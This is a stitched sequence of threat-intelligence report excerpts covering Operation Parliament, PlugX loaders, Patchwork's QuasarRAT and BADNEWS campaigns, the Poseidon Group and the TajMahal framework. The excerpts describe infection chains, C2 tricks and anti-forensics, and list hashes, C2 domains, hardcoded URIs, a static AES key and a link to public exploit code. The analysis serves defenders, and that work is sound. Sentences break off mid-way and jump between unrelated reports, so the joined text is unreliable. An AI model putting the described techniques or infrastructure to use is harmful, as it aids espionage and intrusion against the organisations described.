series of attacks utilizing unknown malware since early 2017 The attacks appear to be geopolitically motivated and target high profile organizations The objective of the attacks is clearly espionage \u2013 they involve gaining access to top legislative, executive and judicial bodies around the world The attackers have targeted a large number of organizations globally since early 2017, with the main focus on the Middle East and North Africa (MENA), especially Palestine High-profile organizations have also been targeted in other regions The number of attacks has decreased since the beginning of 2018 The attacks were initially discovered while investigating a phishing attack that targeted political figures in the MENA region At first the attacks looked to be the work of the low-sophistication Gaza Cybergang (decoys, file names), but further analysis painted a very different picture Targets include high-profile entities such as parliaments, senates, top state offices and officials, political science scholars, military and intelligence agencies, ministries, media outlets, research centers, election commissions, Olympic organizations, large trading companies, and other unknown entities Kaspersky Lab users and Threat Management and Defense clients are protected from the attacks Cisco Talos recently published a blogpost describing targeted attacks in the Middle East region which we believe may be connected Victimology and Statistics Based on our findings, we believe the attackers represent a previously unknown geopolitically motivated threat actor The campaign started in 2017, with the attackers doing just enough to achieve their goals They most likely have access to additional tools when needed and appear to have access to an elaborate database of contacts in sensitive organizations and personnel worldwide, especially of vulnerable and non-trained staff The victim systems range from personal desktop or laptop systems to large servers with domain controller roles or similar The nature of the targeted ministries varied, including those responsible for telecommunications, health, energy, justice, finance and so on Victims have been spotted in the Palestinian Territories, Egypt, Jordan, the UAE, Saudi Arabia, Djibouti, Qatar, Lebanon, Chile, Somalia, Iraq, Morocco, Syria, India, Iran, Canada, the USA, the UK, Germany, Israel, Afghanistan, Serbia, Russia, Oman, Kuwait, South Korea and Denmark Victim organization type Number of victim organizations   Unknown 91   Senates/Parliaments 7   Prime Ministerial Offices 3   Military/Intelligence

Distribution/Logistics 1     The number of victims/victim organizations probably doesn\u2019t represent the full scope of the attacks \u2013 only a portion Attack description and attribution Operation Parliament appears to be another symptom of escalating tensions in the Middle East region The attackers have taken great care to stay under the radar, imitating another attack group in the region They have been particularly careful to verify victim devices before proceeding with the infection, safeguarding their command and control servers The targeting seems to have slowed down since the beginning of 2018, probably winding down when the desired data or access was obtained The targeting of specific victims is unlike previously seen behavior in regional campaigns by Gaza Cybergang or Desert Falcons and points to an elaborate information-gathering exercise that was carried out before the attacks (physical and/or digital) With deception and false flags increasingly being employed by threat actors, attribution is a hard and complicated task that requires solid evidence, especially in complex regions such as the Middle East Functionality was identified that enables HTTP communication with

as part of targeted attacks PlugX is still popular today and its longevity is remarkable The malware itself is well documented, with multiple excellent papers covering most aspects of its functionality Some of the best write-ups on the malware are cited below:  TR-12 \u2013 Analysis of a PlugX malware variant used for targeted attacks (Circl) Analysis of a Recent PlugX Variant \u2013 \u201cP2P PlugX\u201d (JPCert) PlugX some uncovered points (Airbus) PlugX \u2013 The Next Generation (Sophos)  Given this wealth of information in the public domain, PlugX receives a lot of attention from security vendors who put efforts into providing detection mechanisms for it Despite this, it remains a tool of choice for many attackers today, meaning that if attackers are to be successful in using the malware, they must innovate in the delivery and installation of the malware if they are to successfully infect their targets This article discusses a group of PlugX samples which we believe are all used by the same attacker(s), and the measures they have taken to attempt to bypass security mechanisms The targets of these attacks appear to primarily be companies in the video games industry, although other targets may exist outside of our telemetry Specifically, we discovered a series of samples using interesting techniques with respect to:  Resolution of an initial C2 address Combining PlugX with open source tools to initially load the malware Avoiding detection on disk  Palo Alto Networks defends our customers against the samples discussed in this blog in the following ways:  Wildfire identifies all files mentioned in this article as Malicious Palo Alto Networks\u2019 AutoFocus customers can track samples related to this blog via the tag:  ParanoidPlugX  Related

0);window.close();</script>     The first payload is a Windows Installer (MSI) file, and dynamic analysis of this file piqued out interest We could see the malware was PlugX from its actions, yet the C2 address was a pastebin.com URL Looking at the Pastebin post we expected to immediately identify a block of text which would later decode to a C2 address, but glancing at the returned content we were unable to immediately identify the C2 In this case, the shellcode is a copy of PlugX and is the same shellcode contained in the MSI file that we will dissect below .NET Wrapper The main payload is delivered in a Microsoft .NET Framework file within previously mentioned MSI file This registry key causes the malware to run again each time the system reboots This second shellcode block in turn, will unpack the main PlugX DLL in memory using RtlDecompressBuffer As is typical for PlugX, the header of the final DLL is missing its magic DOS and NT image headers, which are replaced with XV instead of MZ and PE as shown in Figure 2 Figure 2 \u2013 The decoded DLL payload using the wrong header, XV instead of MZ/PE Finally, the second shellcode block will resolve the imports and relocations and jump to the entry point of the DLL This DLL itself also contains a default configuration to connect to the localhost on port 12345 This means \u00a0if you extract the DLL manually and execute it then it will connect to localhost:12345 rather than the real C2 server, which was passed as an initial argument to the DLL by the first shellcode The versions discussed in the JPCert blog post used 20140918, 353 while the versions we examined use XOR values of 20141118, 8389 The same decryption routine is also used for any other string obfuscation or file encryption as required by this sample of PlugX Extracting C2 PlugX has a feature to extract encrypted C2 configurations from a given URL In this case, the attackers were creative in hiding the string in a seemingly legitimate block of text It parses the \u201cRSA key\u201d looking for magic values \u201cDZKS\u201d and \u201cDZJS\u201d An overview of the whole execution flow for this sample is given in Figure 3 Figure 3 \u2013 An overview of the execution flow for this sample In all, the attackers have chained together many disparate pieces of code both custom and open source, all in order to load PlugX Given the number of components, this would have taken a reasonable amount of time and indicates their dedication to evading detection whilst continuing to use the same malware Pivoting to other PlugX samples Based on our findings above, we identified other examples of interesting PlugX samples These other examples were identified based on similar samples that were sent to the targeted organizations, infrastructure used by the attackers, as well as unique delivery mechanisms for samples Paranoid PlugX One related series of PlugX samples we examined appeared to be particularly \u201cparanoid\u201d about being detected on disk and so taking specific anti-forensics steps to defeat being detected on the disk In that respect this case is no different, as the eventual payload executed by a legitimate signed Microsoft binary which loads the DLL \u201cBlackBox.dll\u201d To top this off the script runs most of the deletion commands more than once The result is that there should be no evidence that the malware was ever executed on the disk, making it harder for forensics teams to identify how the malware got there, and meaning that memory or network based detection would be required to identify the intrusion The power of open source & PlugX In the first half of 2017, we saw attackers begin to improve upon this \u201cParanoid\u201d version of PlugX \u2013 it wasn\u2019t enough to be in memory-only after getting infecting the system, the attackers also wanted to bypass application whitelisting techniques in use by network defenders To this end, they began incorporating open source techniques, in particular those that have been assembled in a list authored by the GitHub user SubTee For example, the following sample loads the malware as shellcode within a .NET Framework project using msbuild.exe, effectively bypassing application whitelisting techniques: SHA256: 822b313315138a69fc3e3f270f427c02c4215088c214dfaf8ecb460a5418c5f3 This sample approximately follows the GIST published here, but has additional code which appears to be custom to our attacker which acts as a helper to load the shellcode The shellcode is, as in our first example, another PlugX payload Conclusions & Mitigations While PlugX has been well understood by the security community for years, attackers continue to use the malware Some possible reasons for this continued use include:  The operators of the malware are familiar and comfortable with the existing malware, meaning they are reluctant to change Though competent at packaging PlugX in different ways, the attackers would struggle to write a fully featured malware like PlugX The effort required to rebuild a malware as complex as PlugX is not worth the effort when they can bypass defenses without doing so In all likelihood, a combination of these three factors is behind the continued prevalence of the malware Many PlugX attackers continue to use relatively mundane techniques to load the malware, making it easy for defenders to identify and prevent execution of the malware, but others continue to apply new and interesting techniques to evade detection In particular, this set of attackers have made good use of open source tools to package the malware, and show some skill in writing their own wrapper applications to execute payloads Many in the security industry would be quick to recommend application whitelisting as one of the most effective way to reduce the success rate of attacks, however by applying publicly available techniques it is possible to bypass these controls For organizations relying on Application Whitelisting, SubTee\u2019s blog makes a series of recommendations which help prevent these bypass techniques In addition to these mitigations, the Traps 4.0 can be configured to

known as Dropping Elephant This increase in threat activity was consistent with other observations documented over the last few months in blogs by 360 Threat Intelligence Center analyzing attacks on Chinese organizations and Trend Micro noting targets in South Asia From the attacks observed by Volexity, what is most notable is that Patchwork has pivoted its targeting and has launched attacks directly against US-based think tanks Volexity has also found that, in addition to sending malware lures, the Patchwork threat actors are leveraging unique tracking links in their e-mails for the purpose of identifying which recipients opened their e-mail messages In three observed spear phishing campaigns, the threat actors leveraged domains and themes mimicking those of well-known think tank organizations in the United States The group lifted articles and themes from the Council on Foreign Relations (CFR), the Center for Strategic and International Studies (CSIS), and the Mercator Institute for China Studies (MERICS) for use in their spear phishing lures and malicious Rich Text Format (RTF) documents Strangely, in one case, the threat actors also appear to have used a domain name similar to the Foreign Policy Research Institute (FPRI) in a message purporting to be from CFR Each of the spear phishing attacks contained links to .doc files, which were really RTF documents that attempt to exploit CVE-2017-8570 (Composite Moniker) The threat actors appear to have leveraged publicly available exploit code that can be found on Github at the URL: https://github.com/rxwx/CVE-2017-8570 If the exploit is successful, the threat actors will attempt to drop and execute QuasarRAT Details of the malware and the associated attacks are listed below Spear Phishing Messages Each e-mail was sent from the attacker-controlled domain mailcenter.support This domain was not only used to send the phishing e-mails, but also to track which targets opened the e-mail Within each of the HTML-formatted messages, an embedded image tag is used to beacon home to the attacker\u2019s domain, containing an unique identifier specific to the recipient <img

malicious RTF document located at the URL  hxxp://chinapolicyanalysis.org/Chinas_Arctic_Dream.doc The fprii.net domain was used as the sender address, as well as the hosting location of the malicious RTF document The structure of the domain mimics the Foreign Policy Research Institute (FPRI), whose actual domain is fpri.net Sample Message The image below shows an example of how the spear phishing message would look to a recipient Exploitation and Malware Execution Upon opening the above attachments, the recipient will be presented with a document that is a direct copy of a blog post or report released by the think tank organization being impersonated At first glance, everything might look legitimate, but in the background the target user has likely just been infected with QuasarRAT QuasarRAT is a freely available \u201cremote (administration|access) tool\u201d (RAT) written in C# and distributed via Github This RAT provides a variety of functionality that makes it particularly attractive to an attacker When the malicious RTF document is opened, two things happen that allow the attacker malware to run First, the \u201cpackager trick\u201d is leveraged in order to embed the initial QuasarRAT dropper (qrat.exe) in the malicious RTF document Its called the \u201cpackager trick\u201d because any file embedded in an RTF file using packager will be automatically dropped to the %tmp% folder (c:\\Users\\%username%\\AppData\\Local\\Temp) when the RTF document is opened The contents of the malicious scriptlet file (displayed below) clearly show the threat actor executing the initial \u201cqrat.exe\u201d dropper from the current user\u2019s %tmp% directory Note: The scriptlet code is an exact match to that shown on the Github page referenced earlier for CVE-2017-8570 As seen in the image above, the QuasarRAT scheduled task is named Microsoft_Security_Task and runs at 12:00 AM each day Once the task is triggered, it will then repeat every 5 minutes for 60 days When executed, microsoft_network.exe will initiate a request to freegeoip.net in order to determine the geographical location of the infected host Immediately following the request, the malware will begin to beacon over an encrypted connection to the threat actor\u2019s command and control domain tautiaos.com (43.249.37.199) Several related samples were identified and are included in the File Indicators section below Conclusion The addition of US-based think tanks to the list of organizations in the crosshairs of Patchwork shows an increasing diversity in the geographic regions being targeted While there were a few peculiar components to some of the spear phish messages, the campaigns and themes were strategically relevant to the organizations being targeted The Patchwork threat actors also appear to have adopted a technique seen from other APT groups where they are now tracking the effectiveness of their campaigns by recording which recipients have opened the phishing message Finally, although the payload observed being delivered by Patchwork in these campaigns is a readily available open source RAT, it does allow for flexibility in interacting with compromised machines without needing to use custom malware Volexity is actively tracking this group and the infrastructure currently in use for the benefit of its network security monitoring and threat

Subcontinent", "Retrieved May 07, 2019", "Article Content Summary In the past few months, Unit 42 has observed the Patchwork group, alternatively known as Dropping Elephant and Monsoon, conducting campaigns against targets located in the Indian subcontinent Patchwork threat actors utilized a pair of EPS exploits rolled into legitimate, albeit malicious, documents in order to propagate their updated BADNEWS payload The use of weaponized legitimate documents is a longstanding operational standard of this group The malicious documents seen in recent activity refer to a number of topics, including recent military promotions within the Pakistan Army, information related to the Pakistan Atomic Energy Commission, as well as Pakistan\u2019s Ministry of the Interior The BADNEWS malware payload, which these malicious documents ultimately deliver, has been updated since the last public report in December 2017 BADNEWS acts as a backdoor for the attackers, providing them with full control over the victim machine We\u2019ve observed modifications to how the malware obtains its (C2) server information, as well as modifications to the C2 communication These changes to BADNEWS, as well as the use of recent EPS-based exploits, demonstrate that the group are actively updating their toolsets in efforts to stay ahead of the security community In this posting, we detail our findings and document these changes Delivery The malicious documents that Unit 42 examined contained legitimate decoy lures as well as malicious embedded EPS files targeting the CVE-2015-2545 and CVE-2017-0261 vulnerabilities These vulnerabilities are well covered in previous public works, which can be found from PWC and FireEye After the files are dropped, the VMwareCplLauncher.exe executable is run, which in turn loads the vmtools.dll DLL file The flow of execution from the time the victim opens the malicious Microsoft Word document, to the execution of BADNEWS, may be seen below:  Figure 5 Side-loading technique employed to deliver BADNEWS \u00a0 The following image demonstrates the scheduled task created by the modified vmtools.dll to ensure BADNEWS runs and remains running on the victim machine Figure 6 Scheduled task created to load BADNEWS \u00a0 BADNEWS Much of BADNEWS has remained consistent from when it was originally discussed by Forcepoint in August 2016 Additionally, recent analysis by Trend Micro notes some minor changes during 2017 To briefly recap, the BADNEWS malware family acts as a backdoor, with communication occurring over HTTP The malware collects C2 information when it is originally executed via \u201cDead Drop Resolvers\u201d Dead drop resolvers have been used by multiple threat actor groups using various malware families and those behind Patchwork are well versed with this tactic For the remainder of the analysis in this research blog, we are discussing the following file:    SHA256

new variant of BADNEWS is a new mutex that is created to ensure a single instance of BADNEWS is running at a given moment This malware family used the new mutex \u2018com_mycompany_apps_appname_new\u2019 This variant of BADNEWS uses different filenames compared to previous versions The following filenames are used by BADNEWS throughout its execution Previous variants of BADNEWS looked for data between \u2018{{\u2018 and \u2018}}\u2019, and used a simple cipher to decode this data This new variant now looks for data between \u2018[[\u2018 and \u2018]]\u2019 in a number of hardcoded URLs In the example shown above, we are presented with a result of 185.203.118[.]115 after all four steps are taken BADNEWS performs many of the expected functions associated with previous versions including keylogging and identifying files of interest Instead, it looks at fixed drives only It continues to seek out files with the following extensions:  .xls .xlsx .doc .docx .ppt .pptx .pdf  In order to prepare for C2 communication, BADNEWS will aggregate various victim information, which is appended to two strings Additionally, the hardcoded version string of \u20181.0\u2019 is different from previous samples Spawn a new instance of BADNEWS after 5 Upload the file specified by the C2 The following hardcoded URI is used for normal communication with the C2 (note the additional forward slashes):  //e3e7e71a0b28b5e96cc492e636722f73//4sVKAOvu3D//ABDYot0NxyG.php  In the event data is uploaded to the attacker, the following hardcoded URI is used (note the use of backslashes):  \\e3e7e71a0b28b5e96cc492e636722f73\\4sVKAOvu3D\\UYEfgEpXAOE.php  \u00a0 When initial pings are sent to the remote server, BADNEWS includes one of the two previously created strings containing the victim\u2019s information An example request in a sandboxed environment may be seen below:  Figure 8 Example request made by BADNEWS \u00a0 To decrypt the data provided in the POST request, a number of steps are required First, the attackers include a series of extra \u2018=\u2019 and \u2018&\u2019 characters within the data stream Once these are removed, the data is decoded with base64 Finally, the result is decrypted using AES-128 and the following static key (hex-encoded):  DD1876848203D9E10ABCEEC07282FF37  \u00a0 Conclusion The Patchwork group continues to plague victims located within the Indian subcontinent Through the use of relatively new exploits, as well as a constantly evolving malware toolset, they aim to compromise prominent organizations and individuals to further their goals Recent activity has shown a number of lures related to the Pakistan Army, the Pakistan Atomic Energy Commission, as well as the Ministry of the Interior Palo Alto Networks customers are protected against this threat in a number of ways:  Traps blocks the exploit documents witnessed during this campaign WildFire accurately identifies the samples mentioned in

of 2015, Kaspersky researchers from GReAT (Global Research and Analysis Team) got hold of the missing pieces of an intricate puzzle that points to the dawn of the first Portuguese-speaking targeted attack group, named \u201cPoseidon.\u201d The group\u2019s campaigns appear to have been active since at least 2005, while the very first sample found points to 2001 This signals just how long ago the Poseidon threat actor was already working on its offensive framework Why has the Poseidon threat remained undetected for so many years? In reality, it has not Most samples were detected promptly However, Poseidon\u2019s practice of being a \u2018custom-tailored malware implants boutique\u2019 kept security researchers from connecting different campaigns under the umbrella of a single threat actor This approach entails crafting campaigns components on-demand and sometimes fabricating entirely unique malicious artifacts 1st Portuguese-speaking group #ThePoseidonAPT attacks companies globally #TheSAS2016Tweet Our research team was able to put together the disparate pieces of this puzzle by diligently tracing the evolution of Poseidon\u2019s toolkit in pursuit of an overarching understanding of how the actor thinks and the specific practices involved in infecting and extorting its victims With a set of tools developed for the sole purpose of information gathering and privilege escalation, the sophistication level of campaign highlights that, today, regional actors are not far behind better-known players in the global game of targeted attacks Becoming familiar with the operations of the Poseidon Group meant patiently dismantling their modus operandi to unearth the custom-designed infection tools deployed to each of their selected targets This process revealed a series of campaigns with highly-regionalized malware practices and geographically-skewed victim tasking, unsurprising in a region with a gradually-maturing cybercrime industry The proper detection of each iteration of their evolving toolkit may have been enough to thwart specific efforts, but to truly understand the magnitude of Poseidon\u2019s combined operations required an archeological effort to match Frequently asked questions What exactly is the Poseidon Group? The Poseidon Group is a long-running team operating on all domains: land, air, and sea They are dedicated to running targeted attacks campaigns to aggressively collect information from company networks through the use of spear-phishing packaged with embedded, executable elements inside office documents and extensive lateral movement tools The information exfiltrated is then leveraged by a company front to blackmail victim companies into contracting the Poseidon Group as a security firm Even when contracted, the Poseidon Group may continue its infection or initiate another infection at a later time, persisting on the network to continue data collection beyond its contractual obligation The Poseidon Group has been active, using custom code and evolving their toolkit since at least 2005 Their tools are consistently designed to function on English and Portuguese systems spanning the gamut of Windows OS, and their exfiltration methods include the use of hijacked satellite connections Poseidon continues to be active at this time Why do you call it Poseidon\u2019s Targeted Attack Boutique? The presence of several text fragments found in the strings section of executable files belonging to the campaign reveal the actor\u2019s fondness for Greek mythology, especially regarding Poseidon, the God of the Seas (which also coincides with their later abuse of satellite communications meant to service ships at sea) The boutique element is reflected in their artisanally adaptive toolkit for lateral movement and data collection which appears to change from infection to infection to fit custom-tailored requirements for each of their prospective clients The business cycle includes what is euphemistically referred to as \u2018financial forecasting\u2019 using stolen information, so we like to say that Poseidon\u2019s boutique not only deals in targeted attacks but also stolen treasures How did you become aware of this threat? Who reported it? We noticed that several security companies and enthusiasts had unwittingly reported on fragments of Poseidon\u2019s campaigns over the years However, nobody noticed that these fragments actually belonged to the same threat actor Perhaps because many of these campaigns were designed to run on specific machines, using English and Portuguese languages, with diverse command and control servers located in different countries and soon discarded, signing malware with different certificates issued in the name of rogue companies, and so on By carefully collecting all the evidence and then reconstructing the attacker\u2019s timeline, we found that it was actually a single group operating since at least 2005, and possible earlier, and still active on the market With this understanding, GReAT researchers were able to recognize similarities in obfuscation and development traits leading back to widely-reported but little understood variants on a sample in 2015, which searched for prominent leaders and secret documents involving them When did you discover this targeted attack? The very first samples from this campaign were detected by Kaspersky Lab back in the early 2000s However, as noted previously, it is a very complex task to correlate indicators and evidence in order to put together all the pieces of this intricate puzzle By the middle of 2015 it was possible to identify that throughout this period of time it\u2019s been the same threat actor, which we call Poseidon Group Who are the victims? / What can you say about the targets of the attacks? The targets are companies in energy and utilities, telecommunications, public relations, media, financial institutions, governmental institutions, services in general and manufacturing The geographical spread of victims is heavily-skewed towards Brazil, the United States, France, Kazakhstan, United Arab Emirates, India and Russia Many of the victims have joint ventures or partner operations in Brazil The importance of the victims is not measured in numbers since each of these victims is a large-scale (often multinational) enterprise What exactly is being stolen from the target machines? One of the characteristics of the group behind Poseidon is an active exploration of domain-based networks Such network topology is typical for companies and enterprises The highest value asset for these companies is proprietary information, technologies, and business-sensitive information that represents significant value in relation to investments and stock valuations The Poseidon Group actively targets this sort of corporate environment for the theft of intellectual property and commercial information, occasionally focusing on personal information on executives How does Poseidon\u2019s APT Boutique infect computers? The main infection vector for Poseidon is the use of spear-phishing emails including RTF/DOC files, usually with a human resources lure The executables are also often digitally signed and occasionally hidden in alternate data streams to fool security solutions Poseidon\u2019s toolkit displays an awareness of many antivirus providers over the years, attempting to attack or spoof these processes as a means of self-defense for their infections Once the infection happens, it reports to the command and control servers before beginning a complex lateral movement phase This way the attackers actually know what applications and commands they can use without raising an alert to the network administrator during lateral movement and exfiltration Then the attacker looks for all administrator accounts on both the local machine and the network This reflects the Poseidon Group\u2019s familiarity with Windows network administration In many cases, their ultimate interest is the Domain Controller What are the malicious tools used by the Poseidon Group? What are their functions? Poseidon utilizes a variety of tools Their main infection tool has been steadily evolving since 2005, with code remnants remaining the same to this day, while others have been altered to fit the requirements of new operating systems and specific campaigns This tool appears to be designed to operate on high-value corporate systems like Domain Controllers or IIS servers that act as repositories of valuable information, particularly for lateral movement This tool contains several other executable files made in different programming languages ranging from Visual Basic 6 to C#, each one performing a very clear task devised by the group when trying to obtain more information from an objective Poseidon\u2019s conventional means of deceiving users with executable files posing inside Word and RTF document files, and actual poisoned documents with malicious macro-scripts has been the sole method used for compromising their desired targets As we have seen in other targeted campaigns, social engineering and carefully crafted spear-phishing attacks play a crucial role in the effectiveness of getting a foothold in the desired system Other products usually found in corporate environments, such as an SQL server, are being used for lateral movement and credential harvesting using a customized toolset designed by the crafty Poseidon Group The exfiltration of sensitive data is done in order to coerce the victim into a business relationship under the threat of exchanging this information with competitors or leveraging it as part of the company\u2019s offering of \u2018investment forecasting\u2019 Additionally this is the first ever publicly known Portuguese-speaking targeted attacks campaign Are there multiple variants of the Poseidon Group\u2019s malware? Are there any major differences in the variants? Poseidon has maintained a consistently evolving toolkit since the mid-2000s The malware has not avoided detection but instead been so inconspicuous as to not arouse much suspicion due to the fact that this malware only represents the initial phase of the attack An altogether different component is leveraged once Poseidon reaches an important machine like an enterprise\u2019s Domain Controller This is where the main collection takes place by use of the IGT (Information Gathering Tool) toolkit This has actually allowed us to sinkhole several domains A few of these still had active infections attempting to report to the C&Cs This adds an interesting dimension to the story As part of Kaspersky Lab\u2019s commitment to securing cyberspace for everyone, we reached out and notified identifiable victims, regardless of their security solution and provided them with indicators of compromise (IOCs) to help root out the active infection In the process, we were able to confirm the previously described operating procedures for the Poseidon Group Is this a state-sponsored attack? Who is responsible? We do not believe this to be a state-sponsored attack but rather a commercial threat player Collaboration with information-sharing partners and victim institutions allowed us to become aware of the more complicated business cycle involved in this story, greatly adding to our research interest in tracking these campaigns The malware is designed to function specifically on English and Portuguese-language systems This is the first ever Portuguese-speaking targeted attack campaign How long have the attackers been active? The attackers have been active for more than ten years The main distribution of samples goes back to 2005 with possible earlier outliers Operating systems such as Windows 95 for desktop computers and Windows NT for server editions were not uncommon at the time and Poseidon\u2019s team has evolved gradually into targeting the latest flagship editions of Microsoft\u2019s operating systems Recent samples show interest in Windows 2012 Server and Windows 8.1 Did the attackers use any interesting/advanced technologies? During a particular campaign, conventional Poseidon samples were directed to IPs resolving to satellite uplinks The networks abused were designed for internet communications with ships at sea which span a greater geographical area at nearly global scale, while providing nearly no security for their downlinks The malware authors also possess an interesting understanding of execution policies which they leverage to manipulate their victim systems Does Kaspersky Lab detect all variants of this malware? Yes, all samples are detected by signatures and also heuristics With a fully updated Kaspersky Lab anti-malware solution, all customers are protected now The archaeological effort of understanding such a long-standing group can severely complicate victim identification We see traces of upwards of a few tens of companies targeted The exact number of the victims may actually vary At this time, we are reaching out to victims of active infections to offer remediation assistance, IOCs, and our full intelligence report to help them counteract this threat Any victims or potential targets concerned about this threat should please contact us at intelreports@kaspersky.com Who is behind these attacks? We do not speculate on attribution Language code used to compile implants, as well as the language used to describe certain commands used by the group, actually corresponds to Portuguese from Brazil The inclusion of Portuguese language strings and preference for Portuguese systems is prominent throughout the samples The tasking of Poseidon\u2019s campaigns appears to be heavily focused on espionage for commercial interests Speculating further would be unsubstantiated Reference\u00a0samples hashes: 2ce818518ca5fd03cbacb26173aa60ce f3499a9d9ce3de5dc10de3d7831d0938 0a870c900e6db25a0e0a65b8545656d4 2fd8bb121a048e7c9e29040f9a9a6eee 4cc1b23daaaac6bf94f99f309854ea10 2c4aeacd3f7b587c599c2c4b5c1475da f821eb4be9840feaf77983eb7d55e5f6 2ce818518ca5fd03cbacb26173aa60ce Command and control servers: akamaihub[.]com\u00a0\u2013 SINKHOLED by Kaspersky Lab igdata[.]net\u00a0\u2013 SINKHOLED by Kaspersky Lab mozillacdn[.]com\u00a0\u2013 SINKHOLED by Kaspersky Lab msupdatecdn[.]com \u2013 SINKHOLED by Kaspersky Lab sslverification[.]net \u2013 SINKHOLED by Kaspersky Lab For more about counter Poseidon and similar attacks, read this article in the Kaspersky Business Blog ", "AMR", "April 09, 2019", "Project TajMahal \u2013 a sophisticated new APT framework", "Retrieved May 07, 2019.\nAMR", "April 09, 2019", "Project TajMahal \u2013 a sophisticated new APT framework", "Retrieved May 07, 2019", "Article Content Executive summary \u2018TajMahal\u2019 is a previously unknown and technically sophisticated APT framework discovered by Kaspersky Lab in the autumn of 2018 This full-blown spying framework consists of two packages named \u2018Tokyo\u2019 and \u2018Yokohama\u2019 It includes backdoors, loaders, orchestrators, C2 communicators, audio recorders, keyloggers, screen and webcam grabbers, documents and cryptography key stealers, and even its own file indexer for the victim\u2019s machine We discovered up to 80 malicious modules stored in its encrypted Virtual File System, one of the highest numbers of plugins we\u2019ve ever seen for an APT toolset Just to highlight its capabilities, TajMahal is able to steal data from a CD burnt by a victim as well as from the printer queue It can also request to steal a particular file from a previously seen USB stick; next time the USB is connected to the computer, the file will be stolen TajMahal has been developed and used for at least the past five years The first known \u2018legit\u2019 sample timestamp is from August 2013, and the last one is from April 2018 The first confirmed date when TajMahal samples were seen on a victim\u2019s machine is August 2014 More details about TajMahal are available to customers of the Kaspersky Intelligence Reporting service (contact intelreports@kaspersky.com) Technical details We have discovered two different types of TajMahal packages, self-named Tokyo and Yokohama The targeted systems found by Kaspersky Lab were infected with both packages This suggests that Tokyo was used as first stage infection, deploying the fully-functional Yokohama package on interesting victims, and then left in for backup purposes The packages share the same code base, we identified the following interesting features:  Capable of stealing documents sent to the printer queue Data gathered for victim recon includes the backup list for Apple mobile devices Steals written CD images Capable of stealing files previously seen on removable drives once they are available again Steals Internet Explorer, Netscape Navigator, FireFox and RealNetworks cookies If deleted from Frontend file or related registry values, it will reappear after reboot with a new name and startup type Victims So far we have detected a single victim based on our telemetry \u2013 a diplomatic entity from a country in Central Asia Conclusion The TajMahal framework is an intriguing discovery that\u2019s of great interest, not least for its high level of technical sophistication, which is beyond any doubt The huge amount of plugins that implement a number of features is something we have never before seen in any other APT activity For example, it has its own indexer, emergency C2s, is capable of stealing specific files from external drives when they become available again, etc The question is, why go to all that trouble for just one victim? A likely hypothesis is that there are other victims we haven\u2019t found yet This theory is reinforced by the fact that we couldn\u2019t see how one of the files in the VFS was used by the malware, opening the door to the possibility of additional versions of the malware that have yet to be detected Kaspersky Lab products detect the TajMahal APT samples as HEUR:Trojan.Multi.Chaperone.gen Appendix I \u2013 Indicators of compromise A full set of IOCs and Yara rules is available to customers of Kaspersky Intelligence Reporting service \u2013 contact intelreports@kaspersky.com Domains and IPs 104.200.30.125 50.56.240.153 rahasn.webhop.org rahasn.akamake.net rahasn.homewealth.biz File Hashes 22d142f11cf2a30ea4953e1fffb0fa7e 2317d65da4639f4246de200650a70753 27612cb03c89158225ca201721ea1aad 412956675fbc3f8c51f438c1abc100eb 490a140093b5870a47edc29f33542fd2 51a7068640af42c3a7c1b94f1c11ab9d 533340c54bd25256873b3dca34d7f74e 684eca6b62d69ce899a3ec3bb04d0a5b 69a19abf5ba56ee07cdd3425b07cf8bf 6cfd131fef548fcd60fbcdb59317df8e 72dc98449b45a7f1ccdef27d51e31e91 7c733607a0932b1b9a9e27cd6ab55fe0 7d5265e814843b24fcb3787768129040 80c37e062aa4c94697f287352acf2e9d 815f1f8a7bc1e6f94cb5c416e381a110 a43d3b31575846fa4c3992b4143a06da 08e82dc7bae524884b7dc2134942aadb 7bcd736a2394fc49f3e27b3987cce640 57314359df11ffdf476f809671ec0275 b72737b464e50aa3664321e8e001ff32 ce8ce92fb6565181572dce00d69c24f8 5985087678414143d33ffc6e8863b887 84730a6e426fbd3cf6b821c59674c8a0 d5377dc1821c935302c065ad8432c0d2 d8f1356bebda9e77f480a6a60eab36bb 92f8e3f0f1f7cc49fad797a62a169acd 9003cfaac523e94d5479dc6a10575e60 df91b86189adb0a11c47ce2405878fa1 e17bd40f5b5005f4a0c61f9e79a9d8c2 c1e7850da5604e081b9647b58248d7e8 99828721ac1a0e32e4582c3f615d6e57 f559c87b4a14a4be1bd84df6553aaf56 b9c208ea8115232bfd9ec2c62f32d6b8 061089d8cb0ca58e660ce2e433a689b3 0e9afd3a870906ebf34a0b66d8b07435 9c115e9a81d25f9d88e7aaa4313d9a8f 520ee02668a1c7b7c262708e12b1ba6b 7bfba2c69bed6b160261bdbf2b826401 77a745b07d9c453650dd7f683b02b3ed 3a771efb7ba2cd0df247ab570e1408b2 0969b2b399a8d4cd2d751824d0d842b4 fc53f2cd780cd3a01a4299b8445f8511 4e39620afca6f60bb30e031ddc5a4330 bfe3f6a79cad5b9c642bb56f8037c43b 3dfebce4703f30eed713d795b90538b5 9793afcea43110610757bd3b800de517 36db24006e2b492cafb75f2663f241b2 21feb6aa15e02bb0cddbd544605aabad 21feb6aa15e02bb0cddbd544605aabad 649ef1dd4a5411d3afcf108d57ff87af 320b2f1d9551b5d1df4fb19bd9ab253a 3d75c72144d873b3c1c4977fbafe9184 b9cf4301b7b186a75e82a04e87b30fe4 b4e67706103c3b8ee148394ebee3f268 7bfbd72441e1f2ed48fbc0f33be00f24 cdb303f61a47720c7a8c5086e6b2a743 2a6f7ec77ab6bd4297e7b15ae06e2e61 8403a28e0bffa9cc085e7b662d0d5412 3ffd2915d285ad748202469d4a04e1f5 04078ef95a70a04e95bda06cc7bec3fa 235d427f94630575a4ea4bff180ecf5d 8035a8a143765551ca7db4bc5efb5dfd cacaa3bf3b2801956318251db5e90f3c 1aadf739782afcae6d1c3e4d1f315cbd c3e255888211d74cc6e3fb66b69bbffb d9e9f22988d43d73d79db6ee178d70a4 16ab79fb2fd92db0b1f38bedb2f02ed8 8da15a97eaf69ff7ee184fc446f19cf1 ffc7305cb24c1955f9625e525d58aeee c0e72eb4c9f897410c795c1b360090ef 9ad6fa6fdedb2df8055b3d30bd6f64f1 44619a88a6cff63523163c6a4cf375dd a571660c9cf1696a2f4689b2007a12c7 81229c1e272218eeda14892fa8425883 0ac48cfa2ff8351365e99c1d26e082ad Appendix II \u2013 Additional technical details The following table provides the full list of files stored in the VFS with a short description describing what the plugins do:    nn Name Short description   00 01 cs64.dll cs32.dll C2 communication and command processing WatchPoints document stealer 02 03 li64.dll li32.dll LocalInfo Collects a large amount of information, titled \u201cTAJ MAHAL\u201d   04 06 ad64.dll ad32.dll 